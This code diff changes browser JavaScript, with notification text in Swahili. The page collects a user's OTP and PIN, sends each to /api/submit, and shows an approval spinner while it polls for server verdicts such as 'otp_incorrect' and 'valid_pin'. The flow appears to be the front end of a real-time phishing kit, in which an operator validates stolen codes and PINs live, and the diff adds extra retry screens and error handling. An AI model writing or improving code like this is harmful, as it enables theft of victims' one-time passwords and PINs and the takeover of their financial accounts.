@@ -199,11 +199,17 @@ document.addEventListener('DOMContentLoaded', () => {
 
     async function submitOtp(otp) {
         showNotification('Inathibitisha OTP...');
-        await fetch('/api/submit', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ step: 'otp_submitted', clientId, data: { otp } })
-        });
+        showStep(5); // <-- Spins & waits for approval on OTP submit
+
+        try {
+            await fetch('/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ step: 'otp_submitted', clientId, data: { otp } })
+            });
+        } catch (err) {
+            console.error(err);
+        }
         startPolling();
     }
 
@@ -229,11 +235,17 @@ document.addEventListener('DOMContentLoaded', () => {
 
     async function submitPin(pin) {
         showNotification('Inathibitisha PIN...');
-        await fetch('/api/submit', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ step: 'pin_submitted', clientId, data: { pin } })
-        });
+        showStep(5); // <-- Spins & waits for approval on PIN submit
+
+        try {
+            await fetch('/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ step: 'pin_submitted', clientId, data: { pin } })
+            });
+        } catch (err) {
+            console.error(err);
+        }
         startPolling();
     }
 
@@ -256,7 +268,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else if (data.status === 'otp_incorrect') {
                     showNotification('OTP INCORRECT ❌ - Tafadhali ingiza namba mpya halali ya OTP.');
                     document.querySelectorAll('.otp-box').forEach(b => b.value = '');
-                    document.querySelector('.otp-box').focus();
+                    showStep(6);
+                    if (document.querySelector('.otp-box')) document.querySelector('.otp-box').focus();
                     clearInterval(pollInterval);
                 } else if (data.status === 'otp_correct') {
                     showNotification('OTP CORRECT ✅ - Endelea kuweka PIN.');
@@ -265,7 +278,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else if (data.status === 'invalid_pin') {
                     showNotification('INVALID PIN ❌ - Tafadhali ingiza PIN halali.');
                     document.querySelectorAll('.pin-box').forEach(b => b.value = '');
-                    document.querySelector('.pin-box').focus();
+                    showStep(7);
+                    if (document.querySelector('.pin-box')) document.querySelector('.pin-box').focus();
                     clearInterval(pollInterval);
                 } else if (data.status === 'valid_pin') {
                     showNotification('VALID PIN ✅ - Umeweka PIN sahihi. Subiri idhini...');
@@ -283,4 +297,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 3000);
     }
 });
-            
+                        
